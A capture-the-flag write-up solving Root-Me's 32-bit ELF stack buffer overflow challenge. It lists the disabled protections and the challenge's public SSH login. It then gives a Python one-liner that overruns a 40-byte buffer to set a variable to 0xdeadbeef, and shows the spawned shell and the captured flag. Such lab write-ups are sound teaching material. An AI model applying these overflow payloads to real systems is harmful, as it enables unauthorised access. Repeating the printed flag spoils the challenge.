# ELF x86 - Stack buffer overflow basic 1
https://www.root-me.org/en/Challenges/App-System/ELF32-Stack-buffer-overflow-basic-1
```
Pwn the binary, read the flag in .passwd.

Environment configuration :
PIE 	Position Independent Executable 	 No 
RelRO 	Read Only relocations 	                 No 
NX 	Non-Executable Stack 	                 No 
ASLR 	Address Space Layout Randomization 	 No 
SF 	Source Fortification 	                 No 
SSP 	Stack-Smashing Protection 	         No 
SRC 	Source code access 	                 Yes 

Challenge connection informations :

Host	        challenge02.root-me.org
Protocol	SSH
Port	        2222
SSH access 	ssh -p 2222 app-systeme-ch13@challenge02.root-me.org   
Username	app-systeme-ch13
Password	app-systeme-ch13
```

According to the source code (provided in the challenge page), the goal is to change the _check_ variable to 0xdeadbeef.<br>
In addition, the executable will print the values of _check_ and _buf_.<br>

As you may see in the source code, the _buf_ variable is 40 bytes long, and it comes right after the _check_ variable. So, in order to
overwrite the _check_, one should fill the _buf_ variable and then enter the wanted value of check - there is no boundary check so it's possible.<br>

A quick check for validating the last statement:
```sh
app-systeme-ch13@challenge02:~$ python -c "print 'A'*40 + 'DDDD'" | ./ch13 

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADDDD
[check] 0x44444444

You are on the right way!
```

As you may see, the _check_ value is now "DDDD". So let's change it to 0xdeadbeef:
```sh
app-systeme-ch13@challenge02:~$ cat <(python -c "print 'A'*40 + '\xef\xbe\xad\xde'") - | ./ch13 

[buf]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
[check] 0xdeadbeef
Yeah dude! You win!
Opening your shell...
id
uid=1113(app-systeme-ch13) gid=1113(app-systeme-ch13) euid=1213(app-systeme-ch13-cracked) groups=1213(app-systeme-ch13-cracked),100(users),1113(app-systeme-ch13)
cat .passwd
1w4ntm0r3pr0np1s
```
(The _cat_ and the '-' are used for keeping the shell open)
